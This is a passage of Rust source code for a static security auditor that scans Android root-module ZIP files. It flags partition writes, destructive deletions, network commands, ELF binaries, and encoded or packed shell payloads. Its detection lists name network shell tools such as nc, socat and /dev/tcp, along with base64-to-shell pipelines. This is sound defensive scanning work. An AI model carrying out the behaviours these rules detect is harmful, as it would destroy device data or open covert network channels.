#![deny(unsafe_code)]

use anyhow::{Context, Result, bail};
use flate2::read::GzDecoder;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::fs::File;
use std::io::{Cursor, Read, Seek};
use std::path::Path;

const RULE_PARTITION_WRITE: &str = "KSU-AUDIT-FS-001";
const RULE_DESTRUCTIVE_WRITE_UNKNOWN: &str = "KSU-AUDIT-FS-002";
const RULE_FLASH_TOOL: &str = "KSU-AUDIT-FS-003";
const RULE_BROAD_DELETE: &str = "KSU-AUDIT-FS-010";
const RULE_OWN_DELETE: &str = "KSU-AUDIT-FS-011";
const RULE_UNKNOWN_DELETE: &str = "KSU-AUDIT-FS-012";
const RULE_NETWORK: &str = "KSU-AUDIT-NET-001";
const RULE_BINARY_NETWORK: &str = "KSU-AUDIT-NET-002";
const RULE_BINARY_PRESENT: &str = "KSU-AUDIT-BIN-001";
const RULE_BINARY_EXECUTED: &str = "KSU-AUDIT-BIN-002";
const RULE_PACKED_SHELL: &str = "KSU-AUDIT-PACK-001";
const RULE_UNPACK_LIMIT: &str = "KSU-AUDIT-PACK-002";
const RULE_ARCHIVE_PATH: &str = "KSU-AUDIT-ZIP-001";
const RULE_ARCHIVE_LIMIT: &str = "KSU-AUDIT-ZIP-002";

#[derive(Clone, Copy, Debug, Deserialize, Eq, Ord, PartialEq, PartialOrd, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Notice,
    High,
    Critical,
}

impl Severity {
    #[must_use]
    pub const fn requires_confirmation(self) -> bool {
        matches!(self, Self::Notice | Self::High | Self::Critical)
    }
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct Finding {
    pub rule_id: String,
    pub severity: Severity,
    pub path: String,
    pub line: Option<usize>,
    pub title: String,
    pub evidence: String,
    pub provenance: Vec<String>,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct AuditReport {
    pub schema_version: u32,
    pub package_sha256: String,
    pub module_id: Option<String>,
    pub findings: Vec<Finding>,
    pub scanned_files: usize,
    pub derived_artifacts: usize,
}

impl AuditReport {
    #[must_use]
    pub fn requires_confirmation(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity.requires_confirmation())
    }

    #[must_use]
    pub fn has_critical(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity == Severity::Critical)
    }

    #[must_use]
    pub fn required_confirmation_presses(&self) -> usize {
        if !self.requires_confirmation() {
            0
        } else if self.has_critical() {
            2
        } else {
            1
        }
    }

    #[must_use]
    pub fn count(&self, severity: Severity) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.severity == severity)
            .count()
    }
}

#[derive(Clone, Debug)]
pub struct AuditConfig {
    pub max_entries: usize,
    pub max_file_size: usize,
    pub max_total_size: usize,
    pub max_unpack_depth: usize,
    pub max_derived_size: usize,
}

impl Default for AuditConfig {
    fn default() -> Self {
        Self {
            max_entries: 4096,
            max_file_size: 32 * 1024 * 1024,
            max_total_size: 128 * 1024 * 1024,
            max_unpack_depth: 16,
            max_derived_size: 64 * 1024 * 1024,
        }
    }
}

#[derive(Clone)]
struct Artifact {
    path: String,
    bytes: Vec<u8>,
    provenance: Vec<String>,
    depth: usize,
}

#[derive(Default)]
struct ScanState {
    findings: Vec<Finding>,
    seen_derived: BTreeSet<String>,
    derived_bytes: usize,
    derived_artifacts: usize,
    binaries: Vec<String>,
    scripts: Vec<(String, String, Vec<String>)>,
}

pub fn scan_zip_path(path: impl AsRef<Path>, config: &AuditConfig) -> Result<AuditReport> {
    let package_sha256 = sha256_path(&path)?;
    let file = File::open(path.as_ref())
        .with_context(|| format!("open module ZIP {}", path.as_ref().display()))?;
    scan_zip_reader(file, package_sha256, config)
}

pub fn scan_zip_bytes(bytes: &[u8], config: &AuditConfig) -> Result<AuditReport> {
    scan_zip_reader(Cursor::new(bytes), sha256_bytes(bytes), config)
}

pub fn scan_file_bytes(path: impl Into<String>, bytes: &[u8], config: &AuditConfig) -> AuditReport {
    let mut state = ScanState::default();
    scan_artifact(
        Artifact {
            path: path.into(),
            bytes: bytes.to_vec(),
            provenance: Vec::new(),
            depth: 0,
        },
        None,
        config,
        &mut state,
    );
    finish_report(sha256_bytes(bytes), None, 1, state)
}

pub fn sha256_path(path: impl AsRef<Path>) -> Result<String> {
    let mut file = File::open(path.as_ref())
        .with_context(|| format!("open {} for hashing", path.as_ref().display()))?;
    let mut hasher = Sha256::new();
    let mut buffer = [0_u8; 64 * 1024];
    loop {
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }
    Ok(hex_digest(hasher.finalize().as_slice()))
}

fn scan_zip_reader<R: Read + Seek>(
    reader: R,
    package_sha256: String,
    config: &AuditConfig,
) -> Result<AuditReport> {
    let mut archive = zip::ZipArchive::new(reader).context("parse module ZIP")?;
    if archive.len() > config.max_entries {
        bail!(
            "module ZIP contains {} entries, limit is {}",
            archive.len(),
            config.max_entries
        );
    }

    let mut entries = Vec::new();
    let mut total_size = 0_usize;
    let mut module_id = None;
    let mut state = ScanState::default();

    for index in 0..archive.len() {
        let mut entry = archive.by_index(index)?;
        let name = entry.name().replace('\\', "/");
        if !is_safe_zip_path(&name) {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_PATH.to_owned(),
                severity: Severity::Critical,
                path: name,
                line: None,
                title: "Unsafe archive path".to_owned(),
                evidence: "ZIP entry escapes the module root".to_owned(),
                provenance: Vec::new(),
            });
            continue;
        }
        if entry.is_dir() {
            continue;
        }

        let declared_size = usize::try_from(entry.size()).unwrap_or(usize::MAX);
        total_size = total_size.saturating_add(declared_size);
        if declared_size > config.max_file_size || total_size > config.max_total_size {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_LIMIT.to_owned(),
                severity: Severity::High,
                path: name,
                line: None,
                title: "Archive analysis limit exceeded".to_owned(),
                evidence: format!(
                    "declared file size {declared_size} bytes; cumulative size {total_size} bytes"
                ),
                provenance: Vec::new(),
            });
            continue;
        }

        let mut bytes = Vec::with_capacity(declared_size.min(config.max_file_size));
        entry
            .by_ref()
            .take(u64::try_from(config.max_file_size).unwrap_or(u64::MAX) + 1)
            .read_to_end(&mut bytes)?;
        if bytes.len() > config.max_file_size {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_LIMIT.to_owned(),
                severity: Severity::High,
                path: name,
                line: None,
                title: "File is too large to audit".to_owned(),
                evidence: format!("decoded size exceeds {} bytes", config.max_file_size),
                provenance: Vec::new(),
            });
            continue;
        }
        if name == "module.prop" {
            module_id = parse_module_id(&bytes);
        }
        entries.push((name, bytes));
    }

    let scanned_files = entries.len();
    for (path, bytes) in entries {
        scan_artifact(
            Artifact {
                path,
                bytes,
                provenance: Vec::new(),
                depth: 0,
            },
            module_id.as_deref(),
            config,
            &mut state,
        );
    }
    Ok(finish_report(
        package_sha256,
        module_id,
        scanned_files,
        state,
    ))
}

fn finish_report(
    package_sha256: String,
    module_id: Option<String>,
    scanned_files: usize,
    mut state: ScanState,
) -> AuditReport {
    correlate_binary_execution(&mut state);
    let mut consolidated: BTreeMap<_, Finding> = BTreeMap::new();
    for finding in state.findings {
        let key = (
            finding.rule_id.clone(),
            finding.path.clone(),
            finding.line,
            finding.title.clone(),
            finding.evidence.clone(),
        );
        match consolidated.get_mut(&key) {
            Some(existing) if finding.provenance.len() > existing.provenance.len() => {
                existing.provenance = finding.provenance;
            }
            Some(_) => {}
            None => {
                consolidated.insert(key, finding);
            }
        }
    }
    state.findings = consolidated.into_values().collect();
    state.findings.sort_by(|left, right| {
        left.path
            .cmp(&right.path)
            .then(left.line.cmp(&right.line))
            .then(left.rule_id.cmp(&right.rule_id))
            .then(left.provenance.cmp(&right.provenance))
    });
    AuditReport {
        schema_version: 1,
        package_sha256,
        module_id,
        findings: state.findings,
        scanned_files,
        derived_artifacts: state.derived_artifacts,
    }
}

fn scan_artifact(
    artifact: Artifact,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if is_elf(&artifact.bytes) {
        state.binaries.push(artifact.path.clone());
        add_finding(
            state,
            &artifact,
            RULE_BINARY_PRESENT,
            Severity::Notice,
            None,
            "Precompiled ELF content",
            &describe_elf(&artifact.bytes),
        );
        if binary_has_network_indicators(&artifact.bytes) {
            add_finding(
                state,
                &artifact,
                RULE_BINARY_NETWORK,
                Severity::Notice,
                None,
                "Precompiled binary contains network indicators",
                "found a network API or URL marker; runtime behavior cannot be proven statically",
            );
        }
        return;
    }

    if artifact.bytes.starts_with(&[0x1f, 0x8b]) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            None,
            "Compressed executable content",
            "gzip stream decoded without executing it",
        );
        decode_gzip_artifact(artifact, "gzip stream", module_id, config, state);
        return;
    }

    let looks_shell = looks_like_shell(&artifact.path, &artifact.bytes);
    if !looks_shell {
        return;
    }

    let text = String::from_utf8_lossy(&artifact.bytes).into_owned();
    state.scripts.push((
        artifact.path.clone(),
        text.clone(),
        artifact.provenance.clone(),
    ));
    analyze_shell(&artifact, &text, module_id, state);

    for (line, decoded) in decode_static_base64_shells(&text) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            Some(line),
            "Encoded shell payload",
            "static base64 pipeline decoded without executing it",
        );
        scan_derived_bytes(
            artifact.clone(),
            decoded,
            "base64 shell payload",
            module_id,
            config,
            state,
        );
    }
    for (line, decoded) in decode_static_shell_commands(&text) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            Some(line),
            "Static dynamic-shell payload",
            "literal eval/sh -c payload was extracted without executing it",
        );
        scan_derived_bytes(
            artifact.clone(),
            decoded,
            "literal dynamic shell",
            module_id,
            config,
            state,
        );
    }

    if let Some((payload_offset, description)) = detect_gzexe(&artifact.bytes, &text) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            None,
            "Packed shell script",
            &description,
        );
        let payload = artifact.bytes[payload_offset..].to_vec();
        decode_gzip_artifact(
            Artifact {
                path: artifact.path,
                bytes: payload,
                provenance: artifact.provenance,
                depth: artifact.depth,
            },
            "gzexe/gzip payload",
            module_id,
            config,
            state,
        );
    }
}

fn decode_gzip_artifact(
    artifact: Artifact,
    transform: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if artifact.depth >= config.max_unpack_depth {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Unpacking depth limit reached",
            &format!("maximum depth is {}", config.max_unpack_depth),
        );
        return;
    }

    let mut decoder = GzDecoder::new(Cursor::new(&artifact.bytes));
    let remaining = config.max_derived_size.saturating_sub(state.derived_bytes);
    if remaining == 0 {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }
    let mut decoded = Vec::new();
    if let Err(error) = decoder
        .by_ref()
        .take(u64::try_from(remaining).unwrap_or(u64::MAX) + 1)
        .read_to_end(&mut decoded)
    {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Compressed payload could not be decoded",
            &error.to_string(),
        );
        return;
    }
    if decoded.len() > remaining {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }

    scan_derived_bytes(artifact, decoded, transform, module_id, config, state);
}

fn scan_derived_bytes(
    artifact: Artifact,
    decoded: Vec<u8>,
    transform: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if artifact.depth >= config.max_unpack_depth {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Unpacking depth limit reached",
            &format!("maximum depth is {}", config.max_unpack_depth),
        );
        return;
    }
    let remaining = config.max_derived_size.saturating_sub(state.derived_bytes);
    if decoded.len() > remaining {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }
    let digest = sha256_bytes(&decoded);
    if !state.seen_derived.insert(digest) {
        return;
    }
    state.derived_bytes += decoded.len();
    state.derived_artifacts += 1;
    let mut provenance = artifact.provenance;
    provenance.push(format!(
        "{} (layer {})",
        transform,
        artifact.depth.saturating_add(1)
    ));
    scan_artifact(
        Artifact {
            path: artifact.path,
            bytes: decoded,
            provenance,
            depth: artifact.depth + 1,
        },
        module_id,
        config,
        state,
    );
}

fn decode_static_base64_shells(text: &str) -> Vec<(usize, Vec<u8>)> {
    let mut decoded = Vec::new();
    for (line_index, line) in text.lines().enumerate() {
        let tokens = shell_tokens(line);
        let commands = split_commands(&tokens);
        if commands.len() < 3 {
            continue;
        }
        let (producer, producer_args) = normalize_command(commands[0]);
        if !matches!(producer.as_str(), "echo" | "printf") {
            continue;
        }
        let base64_index = commands.iter().position(|command| {
            let (name, args) = normalize_command(command);
            name == "base64"
                && args
                    .iter()
                    .any(|arg| matches!(arg.as_str(), "-d" | "--decode"))
        });
        let shell_index = commands.iter().rposition(|command| {
            matches!(normalize_command(command).0.as_str(), "sh" | "ash" | "bash")
        });
        let (Some(base64_index), Some(shell_index)) = (base64_index, shell_index) else {
            continue;
        };
        if base64_index >= shell_index {
            continue;
        }
        let payload_args =
            if producer == "printf" && producer_args.first().is_some_and(|arg| arg.contains('%')) {
                &producer_args[1..]
            } else {
                producer_args.as_slice()
            };
        let encoded = payload_args.join(if producer == "echo" { " " } else { "" });
        if encoded.contains('$') || encoded.contains('`') || encoded.contains("$(") {
            continue;
        }
        if let Some(bytes) = decode_base64(&encoded) {
            decoded.push((line_index + 1, bytes));
        }
    }
    decoded
}

fn decode_static_shell_commands(text: &str) -> Vec<(usize, Vec<u8>)> {
    let mut decoded = Vec::new();
    for (line_index, line) in text.lines().enumerate() {
        let tokens = shell_tokens(line);
        for command in split_commands(&tokens) {
            let (name, args) = normalize_command(command);
            let payload = if name == "eval" {
                Some(args.join(" "))
            } else if matches!(name.as_str(), "sh" | "ash" | "bash") {
                args.iter()
                    .position(|arg| arg == "-c")
                    .map(|index| args[index + 1..].join(" "))
            } else {
                None
            };
            let Some(payload) = payload else {
                continue;
            };
            if payload.is_empty()
                || payload.contains('$')
                || payload.contains('`')
                || payload.contains("$(")
            {
                continue;
            }
            decoded.push((line_index + 1, payload.into_bytes()));
        }
    }
    decoded
}

fn decode_base64(value: &str) -> Option<Vec<u8>> {
    let values: Vec<u8> = value
        .bytes()
        .filter(|byte| !byte.is_ascii_whitespace())
        .map(|byte| match byte {
            b'A'..=b'Z' => Some(byte - b'A'),
            b'a'..=b'z' => Some(byte - b'a' + 26),
            b'0'..=b'9' => Some(byte - b'0' + 52),
            b'+' => Some(62),
            b'/' => Some(63),
            b'=' => Some(64),
            _ => None,
        })
        .collect::<Option<_>>()?;
    if values.is_empty() || values.len() & 3 != 0 {
        return None;
    }
    let mut output = Vec::with_capacity(values.len() / 4 * 3);
    for chunk in values.chunks_exact(4) {
        if chunk[0] >= 64 || chunk[1] >= 64 {
            return None;
        }
        output.push((chunk[0] << 2) | (chunk[1] >> 4));
        if chunk[2] < 64 {
            output.push((chunk[1] << 4) | (chunk[2] >> 2));
        }
        if chunk[3] < 64 {
            if chunk[2] >= 64 {
                return None;
            }
            output.push((chunk[2] << 6) | chunk[3]);
        }
    }
    Some(output)
}

fn add_unpack_size_limit(state: &mut ScanState, artifact: &Artifact, config: &AuditConfig) {
    add_finding(
        state,
        artifact,
        RULE_UNPACK_LIMIT,
        Severity::High,
        None,
        "Unpacking size limit reached",
        &format!("maximum derived size is {} bytes", config.max_derived_size),
    );
}

fn analyze_shell(artifact: &Artifact, text: &str, module_id: Option<&str>, state: &mut ScanState) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );

    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let line_number = line_index + 1;
        let tokens = shell_tokens(raw_line);
        if tokens.is_empty() {
            continue;
        }
        collect_assignments(&tokens, &mut variables);
        collect_block_target_assignments(raw_line, &mut variables);
        for command in split_commands(&tokens) {
            if command.is_empty() {
                continue;
            }
            let (name, args) = normalize_command(command);
            if name.is_empty() {
                continue;
            }
            if name == "cd"
                && let Some(target) = args.first()
            {
                current_dir = resolve_path(target, &variables, &current_dir);
            }
            analyze_network(artifact, line_number, raw_line, &name, state);
            analyze_delete(
                artifact,
                line_number,
                raw_line,
                &name,
                &args,
                &variables,
                &current_dir,
                module_id,
                state,
            );
            analyze_writes(
                artifact,
                line_number,
                raw_line,
                &name,
                &args,
                &variables,
                &current_dir,
                state,
            );
        }
    }
}

fn collect_block_target_assignments(line: &str, variables: &mut BTreeMap<String, String>) {
    let Some((left, right)) = line.split_once('=') else {
        return;
    };
    let name = left.split_whitespace().last().unwrap_or_default().trim();
    if !is_variable_name(name) {
        return;
    }
    if right.contains("find_block")
        || right.contains("/dev/block/")
        || right.contains("/dev/mapper/")
    {
        variables.insert(name.to_owned(), "/dev/block/$DYNAMIC".to_owned());
    }
}

fn analyze_network(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    state: &mut ScanState,
) {
    const NETWORK_COMMANDS: &[&str] = &[
        "curl", "wget", "aria2c", "nc", "ncat", "netcat", "socat", "ssh", "scp", "sftp", "ftp",
        "tftp", "git", "ping", "nslookup", "dig",
    ];
    if NETWORK_COMMANDS.contains(&name) || raw_line.contains("/dev/tcp/") {
        add_finding(
            state,
            artifact,
            RULE_NETWORK,
            Severity::Notice,
            Some(line),
            "Outbound network behavior",
            raw_line.trim(),
        );
    }
}

#[allow(clippy::too_many_arguments)]
fn analyze_delete(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    args: &[String],
    variables: &BTreeMap<String, String>,
    current_dir: &str,
    module_id: Option<&str>,
    state: &mut ScanState,
) {
    if !matches!(name, "rm" | "unlink" | "rmdir" | "shred") {
        return;
    }
    let targets: Vec<_> = operands_before_redirection(args)
        .into_iter()
        .filter(|arg| !arg.starts_with('-'))
        .map(|arg| resolve_path(arg, variables, current_dir))
        .filter(|target| !target.is_empty())
        .collect();
    if targets.is_empty() {
        return;
    }
    for target in targets {
        let (rule, severity, title) = if is_module_owned(&target, module_id) {
            (RULE_OWN_DELETE, Severity::Info, "Module-owned deletion")
        } else if is_broad_delete(&target) {
            (
                RULE_BROAD_DELETE,
                Severity::Critical,
                "Broad destructive deletion",
            )
        } else if contains_unresolved_variable(&target) {
            (
                RULE_UNKNOWN_DELETE,
                Severity::High,
                "Deletion target cannot be resolved",
            )
        } else {
            (
                RULE_UNKNOWN_DELETE,
                Severity::High,
                "Deletion outside the module directory",
            )
        };
        add_finding(
            state,
            artifact,
            rule,
            severity,
            Some(line),
            title,
            &format!("{} => {target}", raw_line.trim()),
        );
    }
}

#[allow(clippy::too_many_arguments)]
fn analyze_writes(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    args: &[String],
    variables: &BTreeMap<String, String>,
    current_dir: &str,
    state: &mut ScanState,
) {
    let mut targets = Vec::new();
    let mut found_block_target = false;
    if name == "dd" {
        targets.extend(
            args.iter()
                .filter_map(|arg| arg.strip_prefix("of="))
                .map(ToOwned::to_owned),
        );
    }
    if is_destructive_writer(name) {
        let operands: Vec<_> = operands_before_redirection(args)
            .into_iter()
            .filter(|arg| !arg.starts_with('-'))
            .cloned()
            .collect();
        if matches!(name, "cp" | "mv") {
            targets.extend(operands.last().cloned());
        } else {
            targets.extend(operands);
        }
    }
    for window in args.windows(2) {
        if matches!(window[0].as_str(), ">" | ">>") {
            targets.push(window[1].clone());
        }
    }

    for target in targets {
        let resolved = resolve_path(&target, variables, current_dir);
        if is_block_device_path(&resolved) {
            found_block_target = true;
            add_finding(
                state,
                artifact,
                RULE_PARTITION_WRITE,
                Severity::Critical,
                Some(line),
                "Partition or block-device write",
                &format!("{} => {resolved}", raw_line.trim()),
            );
        } else if contains_unresolved_variable(&resolved)
            && (name == "dd" || is_destructive_writer(name))
        {
            add_finding(
                state,
                artifact,
                RULE_DESTRUCTIVE_WRITE_UNKNOWN,
                Severity::High,
                Some(line),
                "Destructive write target cannot be resolved",
                raw_line.trim(),
            );
        }
    }
    if is_flash_writer(name) && !found_block_target {
        add_finding(
            state,
            artifact,
            RULE_FLASH_TOOL,
            Severity::High,
            Some(line),
            "Partition flashing or erasure tool",
            raw_line.trim(),
        );
    }
}

fn correlate_binary_execution(state: &mut ScanState) {
    let binaries = state.binaries.clone();
    let scripts = state.scripts.clone();
    for binary in binaries {
        let basename = posix_basename(&binary);
        for (script_path, text, provenance) in &scripts {
            for (index, line) in text.lines().enumerate() {
                if line.contains(&binary)
                    || line.contains(&format!("$MODPATH/{binary}"))
                    || line.contains(&format!("./{binary}"))
                    || (basename.len() > 2
                        && shell_tokens(line).iter().any(|token| token == basename))
                {
                    state.findings.push(Finding {
                        rule_id: RULE_BINARY_EXECUTED.to_owned(),
                        severity: Severity::Notice,
                        path: script_path.clone(),
                        line: Some(index + 1),
                        title: "Precompiled binary is executed or loaded".to_owned(),
                        evidence: format!("{} references {binary}", line.trim()),
                        provenance: provenance.clone(),
                    });
                }
            }
        }
    }
}

fn add_finding(
    state: &mut ScanState,
    artifact: &Artifact,
    rule_id: &str,
    severity: Severity,
    line: Option<usize>,
    title: &str,
    evidence: &str,
) {
    state.findings.push(Finding {
        rule_id: rule_id.to_owned(),
        severity,
        path: artifact.path.clone(),
        line,
        title: title.to_owned(),
        evidence: evidence.to_owned(),
        provenance: artifact.provenance.clone(),
    });
}

fn detect_gzexe(bytes: &[u8], text: &str) -> Option<(usize, String)> {
    if !text.contains("gzip -cd") || !text.contains("tail") || !text.contains("skip=") {
        return None;
    }
    let skip = text
        .lines()
        .take(32)
        .find_map(|line| line.trim().strip_prefix("skip="))?
        .trim_matches(|character: char| character == '\'' || character == '"')
        .parse::<usize>()
        .ok()?;
    let offset = line_offset(bytes, skip)?;
    if bytes.get(offset..offset + 2) != Some(&[0x1f, 0x8b]) {
        return None;
    }
    Some((
        offset,
        format!("gzexe-style shell with gzip payload beginning at line {skip}"),
    ))
}

fn line_offset(bytes: &[u8], one_based_line: usize) -> Option<usize> {
    if one_based_line == 0 {
        return None;
    }
    if one_based_line == 1 {
        return Some(0);
    }
    let mut line = 1;
    for (index, byte) in bytes.iter().enumerate() {
        if *byte == b'\n' {
            line += 1;
            if line == one_based_line {
                return Some(index + 1);
            }
        }
    }
    None
}

fn looks_like_shell(path: &str, bytes: &[u8]) -> bool {
    path.ends_with(".sh")
        || bytes.starts_with(b"#!")
        || bytes
            .get(..4096.min(bytes.len()))
            .is_some_and(|head| head.windows(7).any(|window| window == b"#!/bin/"))
}

fn is_elf(bytes: &[u8]) -> bool {
    bytes.starts_with(b"\x7fELF")
}

fn describe_elf(bytes: &[u8]) -> String {
    let class = match bytes.get(4) {
        Some(1) => "ELF32",
        Some(2) => "ELF64",
        _ => "ELF",
    };
    let endian = bytes.get(5).copied().unwrap_or(1);
    let kind = bytes
        .get(16..18)
        .map(|pair| {
            if endian == 2 {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        })
        .map_or("unknown", |value| match value {
            1 => "relocatable",
            2 => "executable",
            3 => "shared object",
            4 => "core",
            _ => "unknown",
        });
    format!("{class} {kind}")
}

fn binary_has_network_indicators(bytes: &[u8]) -> bool {
    const INDICATORS: &[&[u8]] = &[
        b"http://",
        b"https://",
        b"connect",
        b"getaddrinfo",
        b"libcurl",
    ];
    INDICATORS.iter().any(|indicator| {
        bytes
            .windows(indicator.len())
            .any(|window| window == *indicator)
    })
}

fn logical_lines(text: &str) -> Vec<String> {
    let mut output = Vec::new();
    let mut current = String::new();
    for line in text.lines() {
        if line.ends_with('\\') {
            current.push_str(line.trim_end_matches('\\'));
            current.push(' ');
        } else {
            current.push_str(line);
            output.push(std::mem::take(&mut current));
        }
    }
    if !current.is_empty() {
        output.push(current);
    }
    output
}

fn shell_tokens(line: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut chars = line.chars().peekable();
    let mut quote = None;
    while let Some(character) = chars.next() {
        if let Some(delimiter) = quote {
            if character == delimiter {
                quote = None;
            } else if character == '\\' && delimiter == '"' {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            } else {
                current.push(character);
            }
            continue;
        }
        match character {
            '\'' | '"' => quote = Some(character),
            '#' if current.is_empty() => break,
            '\\' => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            ' ' | '\t' | '\r' => push_token(&mut tokens, &mut current),
            ';' | '|' | '&' => {
                push_token(&mut tokens, &mut current);
                let mut operator = character.to_string();
                if chars.peek() == Some(&character) {
                    operator.push(chars.next().unwrap_or(character));
                }
                tokens.push(operator);
            }
            '>' | '<' => {
                push_token(&mut tokens, &mut current);
                let mut operator = character.to_string();
                if chars.peek() == Some(&character) {
                    operator.push(chars.next().unwrap_or(character));
                }
                tokens.push(operator);
            }
            '(' | ')' => {
                push_token(&mut tokens, &mut current);
                tokens.push(character.to_string());
            }
            _ => current.push(character),
        }
    }
    push_token(&mut tokens, &mut current);
    tokens
}

fn push_token(tokens: &mut Vec<String>, current: &mut String) {
    if !current.is_empty() {
        tokens.push(std::mem::take(current));
    }
}

fn split_commands(tokens: &[String]) -> Vec<&[String]> {
    let mut commands = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        if matches!(token.as_str(), ";" | "|" | "&&" | "||" | "&" | "(" | ")") {
            if start < index {
                commands.push(&tokens[start..index]);
            }
            start = index + 1;
        }
    }
    if start < tokens.len() {
        commands.push(&tokens[start..]);
    }
    commands
}

fn operands_before_redirection(args: &[String]) -> Vec<&String> {
    let end = args
        .iter()
        .position(|arg| matches!(arg.as_str(), ">" | ">>" | "<" | "<<"))
        .unwrap_or(args.len());
    args[..end].iter().collect()
}

fn normalize_command(command: &[String]) -> (String, Vec<String>) {
    let mut index = command
        .iter()
        .position(|token| !is_assignment(token))
        .unwrap_or(command.len());
    while index < command.len()
        && matches!(
            command[index].as_str(),
            "command" | "env" | "exec" | "if" | "then" | "do" | "!" | "time"
        )
    {
        index += 1;
        while index < command.len() && command[index].starts_with('-') {
            index += 1;
        }
    }
    if index >= command.len() {
        return (String::new(), Vec::new());
    }
    let mut name = posix_basename(&command[index]).to_owned();
    index += 1;
    if matches!(name.as_str(), "busybox" | "toybox") && index < command.len() {
        name.clone_from(&command[index]);
        index += 1;
    }
    (name, command[index..].to_vec())
}

fn collect_assignments(tokens: &[String], variables: &mut BTreeMap<String, String>) {
    for token in tokens {
        if matches!(token.as_str(), ";" | "|" | "&&" | "||") {
            continue;
        }
        let Some((name, value)) = token.split_once('=') else {
            continue;
        };
        if is_variable_name(name) {
            variables.insert(name.to_owned(), expand_variables(value, variables));
        }
    }
}

fn is_assignment(token: &str) -> bool {
    token
        .split_once('=')
        .is_some_and(|(name, _)| is_variable_name(name))
}

fn is_variable_name(name: &str) -> bool {
    !name.is_empty()
        && name.chars().enumerate().all(|(index, character)| {
            character == '_'
                || character.is_ascii_alphanumeric()
                    && (index > 0 || character.is_ascii_alphabetic())
        })
}

fn predefined_variables(module_id: Option<&str>) -> BTreeMap<String, String> {
    let id = module_id.unwrap_or("$MODID");
    BTreeMap::from([
        ("MODID".to_owned(), id.to_owned()),
        (
            "MODPATH".to_owned(),
            format!("/data/adb/modules_update/{id}"),
        ),
        ("TMPDIR".to_owned(), "/data/adb/ksu/.audit-tmp".to_owned()),
    ])
}

fn expand_variables(value: &str, variables: &BTreeMap<String, String>) -> String {
    let mut output = String::new();
    let chars: Vec<_> = value.chars().collect();
    let mut index = 0;
    while index < chars.len() {
        if chars[index] != '$' {
            output.push(chars[index]);
            index += 1;
            continue;
        }
        if index + 1 < chars.len() && chars[index + 1] == '{' {
            let mut end = index + 2;
            while end < chars.len() && chars[end] != '}' {
                end += 1;
            }
            if end < chars.len() {
                let name: String = chars[index + 2..end].iter().collect();
                if let Some(expanded) = variables.get(&name) {
                    output.push_str(expanded);
                } else {
                    output.push_str(&format!("${{{name}}}"));
                }
                index = end + 1;
                continue;
            }
        }
        let mut end = index + 1;
        while end < chars.len() && (chars[end] == '_' || chars[end].is_ascii_alphanumeric()) {
            end += 1;
        }
        if end == index + 1 {
            output.push('$');
            index += 1;
            continue;
        }
        let name: String = chars[index + 1..end].iter().collect();
        if let Some(expanded) = variables.get(&name) {
            output.push_str(expanded);
        } else {
            output.push('$');
            output.push_str(&name);
        }
        index = end;
    }
    output
}

fn resolve_path(value: &str, variables: &BTreeMap<String, String>, current_dir: &str) -> String {
    let expanded = expand_variables(value, variables);
    if expanded.is_empty() {
        return String::new();
    }
    if contains_unresolved_variable(&expanded) || expanded.contains("$(") || expanded.contains('`')
    {
        return expanded;
    }
    // Module scripts always use Android/POSIX paths. Host Path semantics would
    // treat `/system` as relative when the audit tests run on Windows.
    let joined = if expanded.starts_with('/') {
        expanded
    } else {
        format!("{}/{expanded}", current_dir.trim_end_matches('/'))
    };
    normalize_path(&joined)
}

fn normalize_path(path: &str) -> String {
    let mut components: Vec<String> = Vec::new();
    for component in path.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                components.pop();
            }
            value => components.push(value.to_owned()),
        }
    }
    format!("/{}", components.join("/"))
}

fn posix_basename(path: &str) -> &str {
    path.trim_end_matches('/')
        .rsplit('/')
        .next()
        .unwrap_or(path)
}

fn is_module_owned(path: &str, module_id: Option<&str>) -> bool {
    path.starts_with("/data/adb/ksu/.audit-tmp/")
        || path == "/data/adb/ksu/.audit-tmp"
        || module_id.is_some_and(|id| {
